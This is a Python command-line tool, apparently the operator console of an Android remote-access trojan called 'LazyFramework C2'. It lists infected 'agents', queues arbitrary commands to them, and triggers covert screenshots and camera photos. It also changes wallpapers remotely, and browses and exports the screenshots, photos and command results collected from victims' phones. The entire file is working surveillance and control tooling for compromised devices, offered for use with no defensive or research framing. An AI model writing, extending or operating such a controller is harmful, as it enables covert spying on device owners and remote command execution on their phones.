#!/usr/bin/env python3
"""
LazyFramework C2 CLI - Command line tool untuk management
"""

import argparse
import sqlite3
import json
import os
import glob
from datetime import datetime
from database import (
    get_agents, get_commands, get_results, 
    save_command, delete_old_results, get_stats
)
import sys

class Colors:
    """ANSI color codes"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_header(text):
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}{Colors.ENDC}\n")

def print_success(text):
    print(f"{Colors.GREEN}✅ {text}{Colors.ENDC}")

def print_error(text):
    print(f"{Colors.RED}❌ {text}{Colors.ENDC}")

def print_warning(text):
    print(f"{Colors.YELLOW}⚠️  {text}{Colors.ENDC}")

def format_file_size(size):
    if size <= 0:
        return "0 B"
    units = ["B", "KB", "MB", "GB"]
    digit_groups = int((len(str(size)) - 1) / 3)
    return f"{size / (1024 ** digit_groups):.1f} {units[digit_groups]}"

# ==================== AGENTS COMMANDS ====================

def cmd_list_agents(args):
    """List all agents"""
    print_header("Connected Agents")
    
    agents = get_agents(limit=1000)
    
    if not agents:
        print_warning("No agents connected")
        return
    
    print(f"{Colors.CYAN}{'Agent ID':<20} {'Device':<20} {'Android':<10} {'Last Seen':<20}{Colors.ENDC}")
    print("-" * 70)
    
    for agent in agents:
        agent_id = agent['agent_id'][:16] + "..." if len(agent['agent_id']) > 16 else agent['agent_id']
        device = (agent['device'] or 'Unknown')[:20]
        android = (agent['android_version'] or 'Unknown')[:10]
        last_seen = datetime.fromisoformat(agent['last_seen']).strftime('%Y-%m-%d %H:%M:%S')
        
        print(f"{agent_id:<20} {device:<20} {android:<10} {last_seen:<20}")
    
    print(f"\n{Colors.GREEN}Total: {len(agents)} agents{Colors.ENDC}\n")

def cmd_show_agent(args):
    """Show agent details"""
    from database import get_agent
    
    agent = get_agent(args.agent_id)
    
    if not agent:
        print_error(f"Agent {args.agent_id} not found")
        return
    
    print_header(f"Agent: {args.agent_id}")
    print(f"Device:        {agent['device'] or 'Unknown'}")
    print(f"Android:       {agent['android_version'] or 'Unknown'}")
    print(f"Manufacturer:  {agent['manufacturer'] or 'Unknown'}")
    print(f"Created:       {agent['created_at']}")
    print(f"Last Seen:     {agent['last_seen']}\n")

# ==================== COMMAND COMMANDS ====================

def cmd_send_command(args):
    """Send command ke agent"""
    print_header("Send Command")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    if not args.command:
        print_error("Specify command with --command")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command=args.command, status='pending')
    print_success(f"Command sent! Command ID: {cmd_id}")
    print(f"Agent:   {args.agent_id}")
    print(f"Command: {args.command}\n")

def cmd_list_commands(args):
    """List pending commands"""
    print_header("Pending Commands")
    
    commands = get_commands(status='pending', limit=50)
    
    if not commands:
        print_warning("No pending commands")
        return
    
    print(f"{Colors.CYAN}{'ID':<5} {'Agent':<20} {'Command':<25} {'Created':<20}{Colors.ENDC}")
    print("-" * 70)
    
    for cmd in commands:
        agent_id = cmd['agent_id'][:20] + "..." if len(cmd['agent_id']) > 20 else cmd['agent_id']
        command = cmd['command'][:25]
        created = datetime.fromisoformat(cmd['created_at']).strftime('%Y-%m-%d %H:%M:%S')
        
        print(f"{cmd['id']:<5} {agent_id:<20} {command:<25} {created:<20}")
    
    print(f"\n{Colors.GREEN}Total: {len(commands)} pending{Colors.ENDC}\n")

# ==================== RESULTS COMMANDS ====================

def cmd_list_results(args):
    """List results dari agent"""
    print_header(f"Results for {args.agent_id}")
    
    results = get_results(agent_id=args.agent_id, limit=20)
    
    if not results:
        print_warning("No results for this agent")
        return
    
    print(f"{Colors.CYAN}{'ID':<5} {'Command':<25} {'Size':<10} {'Created':<20}{Colors.ENDC}")
    print("-" * 60)
    
    for result in results:
        command = result['command'][:25]
        size = f"{result['result_size']/1024:.1f}KB" if result['result_size'] else "0KB"
        created = datetime.fromisoformat(result['created_at']).strftime('%Y-%m-%d %H:%M:%S')
        
        print(f"{result['id']:<5} {command:<25} {size:<10} {created:<20}")
    
    print(f"\n{Colors.GREEN}Total: {len(results)} results{Colors.ENDC}\n")

def cmd_show_result(args):
    """Show specific result"""
    from database import get_connection
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM results WHERE id = ?', (args.result_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        print_error(f"Result {args.result_id} not found")
        return
    
    print_header(f"Result: {args.result_id}")
    print(f"Agent:   {row['agent_id']}")
    print(f"Command: {row['command']}")
    print(f"Size:    {row['result_size']} bytes")
    print(f"Created: {row['created_at']}\n")
    
    print(f"{Colors.CYAN}Result Content:{Colors.ENDC}")
    print("-" * 60)
    
    try:
        data = json.loads(row['result'])
        print(json.dumps(data, indent=2))
    except:
        print(row['result'])
    
    print()

# ==================== SCREENSHOT COMMANDS ====================

def cmd_screenshot_take(args):
    """Take screenshot"""
    print_header("Screenshot")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='SCREENSHOT', status='pending')
    print_success(f"Screenshot command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print("🖼️ Waiting for screenshot...\n")

def cmd_screenshot_list(args):
    """List screenshots from agent"""
    print_header(f"Screenshots for {args.agent_id}")
    
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        print_warning("No screenshots directory")
        return
    
    pattern = f"{screenshot_dir}/{args.agent_id}_screenshot_*.jpg"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No screenshots for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<40} {'Size':<15} {'Modified':<20}{Colors.ENDC}")
    print("-" * 75)
    
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        
        print(f"{filename:<40} {size_str:<15} {modified:<20}")
    
    print(f"\n{Colors.GREEN}Total: {len(files)} screenshots{Colors.ENDC}\n")

# ==================== CAMERA COMMANDS ====================

def cmd_camera_snapshot(args):
    """Take camera snapshot"""
    print_header("Camera Snapshot")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='CAMERA_SNAPSHOT', status='pending')
    print_success(f"Camera snapshot command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print("📸 Waiting for photo...\n")

def cmd_camera_list(args):
    """List photos from agent"""
    print_header(f"Photos for {args.agent_id}")
    
    photo_dir = 'photos'
    if not os.path.exists(photo_dir):
        print_warning("No photos directory")
        return
    
    pattern = f"{photo_dir}/{args.agent_id}_snapshot_*.jpg"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No photos for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<40} {'Size':<15} {'Modified':<20}{Colors.ENDC}")
    print("-" * 75)
    
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        
        print(f"{filename:<40} {size_str:<15} {modified:<20}")
    
    print(f"\n{Colors.GREEN}Total: {len(files)} photos{Colors.ENDC}\n")

# ==================== WALLPAPER COMMANDS ====================

def cmd_wallpaper_set(args):
    """Set wallpaper from URL or file"""
    print_header("Set Wallpaper")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    if not args.image:
        print_error("Specify image URL or path with --image")
        return
    
    if os.path.exists(args.image):
        import base64
        with open(args.image, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode()
        command = f"SET_WALLPAPER {image_data}"
        print(f"📁 Using local file: {args.image}")
    else:
        command = f"SET_WALLPAPER {args.image}"
        print(f"🌐 Using URL: {args.image}")
    
    cmd_id = save_command(agent_id=args.agent_id, command=command, status='pending')
    print_success(f"Wallpaper command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}\n")

# ==================== DATABASE COMMANDS ====================

def cmd_stats(args):
    """Show database statistics"""
    print_header("C2 Server Statistics")
    
    stats = get_stats()
    
    print(f"Connected Agents:    {Colors.GREEN}{stats['agents']}{Colors.ENDC}")
    print(f"Pending Commands:    {Colors.YELLOW}{stats['pending_commands']}{Colors.ENDC}")
    print(f"Total Results:       {Colors.BLUE}{stats['results']}{Colors.ENDC}\n")

def cmd_cleanup(args):
    """Cleanup old results"""
    print_header("Database Cleanup")
    
    days = args.days or 30
    
    print(f"Deleting results older than {days} days...")
    delete_old_results(days=days)
    
    print_success(f"Cleanup completed!\n")

def cmd_export(args):
    """Export data to JSON"""
    print_header("Export Data")
    
    data = {
        'agents': get_agents(limit=10000),
        'results': get_results(limit=10000),
        'exported_at': datetime.now().isoformat()
    }
    
    filename = args.output or f"c2_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    
    print_success(f"Exported to {filename}\n")

# ==================== MAIN ====================

def main():
    parser = argparse.ArgumentParser(
        description='LazyFramework C2 CLI Management Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python cli.py agents list              # List all agents
  python cli.py agents show abc123       # Show agent details
  python cli.py command send -a agent_id -c GET_DEVICE_INFO
  python cli.py screenshot take -a agent_id
  python cli.py screenshot list -a agent_id
  python cli.py camera snapshot -a agent_id
  python cli.py camera list -a agent_id
  python cli.py wallpaper set -a agent_id -i image.jpg
  python cli.py results list -a agent_id
  python cli.py db stats
        '''
    )
    
    subparsers = parser.add_subparsers(dest='category', help='Command category')
    
    # ==================== AGENTS ====================
    agents_parser = subparsers.add_parser('agents', help='Manage agents')
    agents_sub = agents_parser.add_subparsers(dest='action')
    
    agents_list = agents_sub.add_parser('list', help='List all agents')
    agents_list.set_defaults(func=cmd_list_agents)
    
    agents_show = agents_sub.add_parser('show', help='Show agent details')
    agents_show.add_argument('agent_id', help='Agent ID')
    agents_show.set_defaults(func=cmd_show_agent)
    
    # ==================== COMMAND ====================
    command_parser = subparsers.add_parser('command', help='Manage commands')
    command_sub = command_parser.add_subparsers(dest='action')
    
    command_send = command_sub.add_parser('send', help='Send command')
    command_send.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    command_send.add_argument('-c', '--command', help='Command to execute', required=True)
    command_send.set_defaults(func=cmd_send_command)
    
    command_list = command_sub.add_parser('list', help='List pending commands')
    command_list.set_defaults(func=cmd_list_commands)
    
    # ==================== SCREENSHOT ====================
    screenshot_parser = subparsers.add_parser('screenshot', help='Screenshot commands')
    screenshot_sub = screenshot_parser.add_subparsers(dest='action')
    
    screenshot_take = screenshot_sub.add_parser('take', help='Take screenshot')
    screenshot_take.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    screenshot_take.set_defaults(func=cmd_screenshot_take)
    
    screenshot_list = screenshot_sub.add_parser('list', help='List screenshots')
    screenshot_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    screenshot_list.set_defaults(func=cmd_screenshot_list)
    
    # ==================== CAMERA ====================
    camera_parser = subparsers.add_parser('camera', help='Camera commands')
    camera_sub = camera_parser.add_subparsers(dest='action')
    
    camera_snapshot = camera_sub.add_parser('snapshot', help='Take photo')
    camera_snapshot.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    camera_snapshot.set_defaults(func=cmd_camera_snapshot)
    
    camera_list = camera_sub.add_parser('list', help='List photos')
    camera_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    camera_list.set_defaults(func=cmd_camera_list)
    
    # ==================== WALLPAPER ====================
    wallpaper_parser = subparsers.add_parser('wallpaper', help='Wallpaper commands')
    wallpaper_sub = wallpaper_parser.add_subparsers(dest='action')
    
    wallpaper_set = wallpaper_sub.add_parser('set', help='Set wallpaper')
    wallpaper_set.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wallpaper_set.add_argument('-i', '--image', help='Image URL or file path', required=True)
    wallpaper_set.set_defaults(func=cmd_wallpaper_set)
    
    # ==================== RESULTS ====================
    results_parser = subparsers.add_parser('results', help='Manage results')
    results_sub = results_parser.add_subparsers(dest='action')
    
    results_list = results_sub.add_parser('list', help='List results')
    results_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    results_list.set_defaults(func=cmd_list_results)
    
    results_show = results_sub.add_parser('show', help='Show result detail')
    results_show.add_argument('result_id', type=int, help='Result ID')
    results_show.set_defaults(func=cmd_show_result)
    
    # ==================== DATABASE ====================
    db_parser = subparsers.add_parser('db', help='Database operations')
    db_sub = db_parser.add_subparsers(dest='action')
    
    db_stats = db_sub.add_parser('stats', help='Show statistics')
    db_stats.set_defaults(func=cmd_stats)
    
    db_cleanup = db_sub.add_parser('cleanup', help='Cleanup old data')
    db_cleanup.add_argument('--days', type=int, default=30, help='Delete data older than N days')
    db_cleanup.set_defaults(func=cmd_cleanup)
    
    db_export = db_sub.add_parser('export', help='Export data')
    db_export.add_argument('-o', '--output', help='Output filename')
    db_export.set_defaults(func=cmd_export)
    
    # Parse args
    args = parser.parse_args()
    
    if not hasattr(args, 'func'):
        parser.print_help()
        sys.exit(0)
    
    try:
        args.func(args)
    except Exception as e:
        print_error(str(e))
        sys.exit(1)

if __name__ == '__main__':
    main()
